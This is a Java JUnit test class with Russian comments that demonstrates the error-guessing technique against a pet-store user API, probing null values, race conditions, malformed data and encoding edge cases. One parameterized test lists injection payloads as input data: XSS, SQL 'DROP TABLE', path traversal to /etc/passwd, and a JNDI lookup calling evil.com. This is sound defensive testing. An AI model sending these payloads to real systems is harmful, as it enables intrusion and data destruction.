package org.openapitools.techniques;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.openapitools.base.BaseApiTest;
import org.openapitools.client.model.petStoreModel.User;

import java.util.Arrays;
import java.util.Collections;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Демонстрация техники Error Guessing (Угадывание ошибок)
 * 
 * Error Guessing - это неформальная техника тест-дизайна, основанная на опыте тестировщика
 * и его способности предугадать наиболее вероятные источники ошибок в системе.
 * 
 * Основные принципы:
 * 1. Использование опыта и интуиции тестировщика
 * 2. Знание типичных ошибок разработки
 * 3. Анализ проблемных областей системы
 * 4. Тестирование "подозрительных" сценариев
 * 
 * Типичные категории ошибок:
 * - Обработка null и пустых значений
 * - Граничные условия и переполнения
 * - Неправильные форматы данных
 * - Состояния гонки и параллелизм
 * - Неожиданные пользовательские действия
 * - Проблемы с кодировкой и спецсимволами
 * 
 * Применяется когда:
 * - Есть опыт работы с похожими системами
 * - Известны слабые места технологии/фреймворка
 * - Нужно дополнить формальные техники тестирования
 * - Ограничено время на тестирование
 */
@DisplayName("Error Guessing - Угадывание ошибок")
public class ErrorGuessingTest extends BaseApiTest {

    @Test
    @DisplayName("Error Guessing: Null и пустые значения")
    void testNullAndEmptyValuesErrorGuessing() {
        /**
         * Основываясь на опыте, null значения - частая причина ошибок
         * Тестируем все возможные null комбинации для User
         */
        
        // Подозрительный случай 1: Полностью null пользователь
        assertThrows(Exception.class, () -> {
            userRestClient.createUser(null);
        }, "Создание null пользователя должно вызывать ошибку");

        // Подозрительный случай 2: Пользователь с null username
        User userWithNullUsername = new User()
                .username(null)
                .email("test@example.com")
                .password("password123");

        assertThrows(Exception.class, () -> {
            userRestClient.createUser(userWithNullUsername);
        }, "Null username должен вызывать ошибку");

        // Подозрительный случай 3: Пустые строки (часто обрабатываются по-разному чем null)
        User userWithEmptyFields = new User()
                .username("")
                .email("")
                .password("")
                .firstName("")
                .lastName("");

        assertThrows(Exception.class, () -> {
            userRestClient.createUser(userWithEmptyFields);
        }, "Пустые поля должны вызывать ошибку");

        // Подозрительный случай 4: Только пробелы (часто пропускается валидацией)
        User userWithWhitespaceFields = new User()
                .username("   ")
                .email("   ")
                .password("   ");

        assertThrows(Exception.class, () -> {
            userRestClient.createUser(userWithWhitespaceFields);
        }, "Поля с пробелами должны вызывать ошибку");

        logData("Error Guessing", "Null и пустые значения протестированы");
    }

    @ParameterizedTest(name = "Подозрительный символ: '{0}'")
    @ValueSource(strings = {
        "user<script>alert('xss')</script>",  // XSS попытка
        "user'; DROP TABLE users; --",        // SQL Injection попытка
        "user\0null_byte",                    // Null byte
        "user\n\r\t",                        // Управляющие символы
        "user\"quote'mixed",                  // Смешанные кавычки
        "пользователь",                       // Unicode символы
        "user@#$%^&*()",                     // Спецсимволы
        "verylongusernamethatexceedstypicallimitsandmightcauseproblems", // Очень длинное имя
        "../../../etc/passwd",               // Path traversal
        "${jndi:ldap://evil.com/a}"          // JNDI injection
    })
    @DisplayName("Error Guessing: Подозрительные символы и инъекции")
    void testSuspiciousCharactersErrorGuessing(String suspiciousUsername) {
        /**
         * Основываясь на опыте безопасности, тестируем потенциально опасные входные данные
         */
        
        User suspiciousUser = new User()
                .username(suspiciousUsername)
                .email("test@example.com")
                .password("password123")
                .firstName("Test")
                .lastName("User");

        try {
            // Система должна либо отклонить подозрительные данные, либо правильно их обработать
            User createdUser = userRestClient.createUser(suspiciousUser);
            
            if (createdUser != null) {
                // Если пользователь создан, проверяем, что данные корректно сохранены/экранированы
                assertNotNull(createdUser.getUsername());
                logData("Подозрительные данные приняты", "Username: " + suspiciousUsername);
                
                // Очистка
                try {
                    userRestClient.deleteUser(createdUser.getUsername());
                } catch (Exception e) {
                    logError("Ошибка при удалении подозрительного пользователя", e);
                }
            }
        } catch (Exception e) {
            // Ожидаемое поведение - отклонение подозрительных данных
            logData("Подозрительные данные отклонены", "Username: " + suspiciousUsername + ", Error: " + e.getMessage());
        }
    }

    @Test
    @DisplayName("Error Guessing: Состояния гонки и параллельные операции")
    void testRaceConditionsErrorGuessing() {
        /**
         * Основываясь на опыте, параллельные операции часто вызывают проблемы
         */
        
        String baseUsername = "race_test_" + System.currentTimeMillis();
        
        // Подозрительный случай: Создание одного пользователя параллельно
        Runnable createUserTask = () -> {
            try {
                User user = new User()
                        .username(baseUsername)
                        .email("race@example.com")
                        .password("password123")
                        .firstName("Race")
                        .lastName("Test");
                        
                userRestClient.createUser(user);
                logData("Параллельное создание", "Пользователь создан в потоке: " + Thread.currentThread().getName());
            } catch (Exception e) {
                logData("Параллельное создание", "Ошибка в потоке " + Thread.currentThread().getName() + ": " + e.getMessage());
            }
        };

        // Запускаем несколько потоков одновременно
        Thread thread1 = new Thread(createUserTask, "Thread-1");
        Thread thread2 = new Thread(createUserTask, "Thread-2");
        Thread thread3 = new Thread(createUserTask, "Thread-3");

        thread1.start();
        thread2.start();
        thread3.start();

        try {
            thread1.join(5000);
            thread2.join(5000);
            thread3.join(5000);
        } catch (InterruptedException e) {
            logError("Прерывание при ожидании потоков", e);
        }

        // Очистка
        try {
            userRestClient.deleteUser(baseUsername);
        } catch (Exception e) {
            logData("Очистка", "Пользователь не найден или уже удален");
        }

        logData("Error Guessing", "Тест состояний гонки завершен");
    }

    @Test
    @DisplayName("Error Guessing: Неожиданные последовательности операций")
    void testUnexpectedOperationSequencesErrorGuessing() {
        /**
         * Основываясь на опыте, пользователи часто делают неожиданные действия
         */
        
        String username = "sequence_test_" + System.currentTimeMillis();
        
        // Подозрительный случай 1: Удаление несуществующего пользователя
        assertThrows(Exception.class, () -> {
            userRestClient.deleteUser("nonexistent_user_" + System.currentTimeMillis());
        }, "Удаление несуществующего пользователя должно вызывать ошибку");

        // Подозрительный случай 2: Обновление несуществующего пользователя
        User nonExistentUser = new User()
                .username("nonexistent_" + System.currentTimeMillis())
                .email("test@example.com");

        assertThrows(Exception.class, () -> {
            userRestClient.updateUser(nonExistentUser);
        }, "Обновление несуществующего пользователя должно вызывать ошибку");

        // Подозрительный случай 3: Двойное создание одного пользователя
        User user = new User()
                .username(username)
                .email("double@example.com")
                .password("password123")
                .firstName("Double")
                .lastName("Create");

        try {
            User firstCreate = userRestClient.createUser(user);
            assertNotNull(firstCreate);

            // Попытка создать того же пользователя еще раз
            assertThrows(Exception.class, () -> {
                userRestClient.createUser(user);
            }, "Повторное создание пользователя должно вызывать ошибку");

            // Очистка
            userRestClient.deleteUser(username);

        } catch (Exception e) {
            logError("Ошибка в тесте двойного создания", e);
        }

        logData("Error Guessing", "Неожиданные последовательности протестированы");
    }

    @Test
    @DisplayName("Error Guessing: Проблемы с форматами данных")
    void testDataFormatProblemsErrorGuessing() {
        /**
         * Основываясь на опыте, некорректные форматы данных - частая проблема
         */
        
        // Подозрительный случай 1: Неправильные форматы email
        String[] suspiciousEmails = {
            "not-an-email",
            "@example.com",
            "user@",
            "user@@example.com",
            "user@example",
            "user@.com",
            "user@example.",
            "user with spaces@example.com",
            "очень@русский.домен",
            "user@тест.рф"
        };

        for (String email : suspiciousEmails) {
            User userWithBadEmail = new User()
                    .username("emailtest_" + System.currentTimeMillis())
                    .email(email)
                    .password("password123");

            try {
                userRestClient.createUser(userWithBadEmail);
                logData("Подозрительный email принят", email);
                // Если создался, удаляем
                userRestClient.deleteUser(userWithBadEmail.getUsername());
            } catch (Exception e) {
                logData("Подозрительный email отклонен", email + " - " + e.getMessage());
            }
        }

        // Подозрительный случай 2: Экстремальные числовые значения
        Integer[] suspiciousUserStatuses = {
            -1, -999, Integer.MIN_VALUE, Integer.MAX_VALUE, 999999
        };

        for (Integer status : suspiciousUserStatuses) {
            User userWithBadStatus = new User()
                    .username("statustest_" + System.currentTimeMillis())
                    .email("status@example.com")
                    .password("password123")
                    .userStatus(status);

            try {
                userRestClient.createUser(userWithBadStatus);
                logData("Подозрительный статус принят", status.toString());
                userRestClient.deleteUser(userWithBadStatus.getUsername());
            } catch (Exception e) {
                logData("Подозрительный статус отклонен", status + " - " + e.getMessage());
            }
        }

        logData("Error Guessing", "Проблемы с форматами данных протестированы");
    }

    @Test
    @DisplayName("Error Guessing: Проблемы с кодировкой и локализацией")
    void testEncodingAndLocalizationErrorGuessing() {
        /**
         * Основываясь на опыте, проблемы с кодировкой часто возникают в международных приложениях
         */
        
        // Подозрительный случай: Различные языки и кодировки
        String[][] suspiciousNames = {
            {"中文用户", "测试@例子.中国"},      // Китайский
            {"пользователь", "тест@пример.рф"}, // Русский
            {"🙂😀🎉", "emoji@test.com"},        // Emoji
            {"user\u0000null", "null@test.com"}, // Null character
            {"user\u200B", "invisible@test.com"}, // Zero-width space
            {"𝕦𝗌𝖾𝗋", "math@test.com"},          // Mathematical characters
            {"ﺍﻟﻤﺴﺘﺨﺪﻡ", "arabic@test.com"}     // Arabic (RTL)
        };

        for (String[] nameSet : suspiciousNames) {
            String username = nameSet[0] + "_" + System.currentTimeMillis();
            String email = nameSet[1];
            
            User userWithSpecialChars = new User()
                    .username(username)
                    .email(email)
                    .password("password123")
                    .firstName(nameSet[0])
                    .lastName("TestUser");

            try {
                User createdUser = userRestClient.createUser(userWithSpecialChars);
                
                if (createdUser != null) {
                    // Проверяем, что данные сохранились корректно
                    assertEquals(username, createdUser.getUsername(), "Username должен сохраниться корректно");
                    logData("Специальные символы приняты", "Username: " + username + ", Email: " + email);
                    
                    userRestClient.deleteUser(username);
                }
            } catch (Exception e) {
                logData("Специальные символы отклонены", "Username: " + username + " - " + e.getMessage());
            }
        }

        logData("Error Guessing", "Проблемы с кодировкой протестированы");
    }

    @Test
    @DisplayName("Error Guessing: Проблемы с массовыми операциями")
    void testBatchOperationProblemsErrorGuessing() {
        /**
         * Основываясь на опыте, массовые операции часто имеют проблемы с производительностью и памятью
         */
        
        // Подозрительный случай 1: Пустой массив
        try {
            userRestClient.createUsersWithArray(Collections.emptyList());
            logData("Пустой массив", "Операция выполнена успешно");
        } catch (Exception e) {
            logData("Пустой массив", "Ошибка: " + e.getMessage());
        }

        // Подозрительный случай 2: null в массиве
        try {
            userRestClient.createUsersWithArray(Arrays.asList((User) null));
            logData("Null в массиве", "Операция выполнена успешно");
        } catch (Exception e) {
            logData("Null в массиве", "Ошибка: " + e.getMessage());
        }

        // Подозрительный случай 3: Смешанные валидные и невалидные данные
        User validUser = new User()
                .username("valid_" + System.currentTimeMillis())
                .email("valid@example.com")
                .password("password123");

        User invalidUser = new User()
                .username("")  // Невалидный
                .email("invalid-email")
                .password("");

        try {
            userRestClient.createUsersWithArray(Arrays.asList(validUser, invalidUser));
            logData("Смешанные данные", "Операция выполнена успешно");
        } catch (Exception e) {
            logData("Смешанные данные", "Ошибка: " + e.getMessage());
        }

        logData("Error Guessing", "Массовые операции протестированы");
    }

    @Override
    protected void cleanup() {
        // Реализация очистки для Error Guessing тестов
    }

    @BeforeEach
    void setUpErrorGuessing() {
        logData("Техника тестирования", "Error Guessing");
        logData("Описание", "Предугадывание типичных ошибок на основе опыта");
        logData("Подход", "Неформальный, основанный на интуиции и знаниях");
    }
}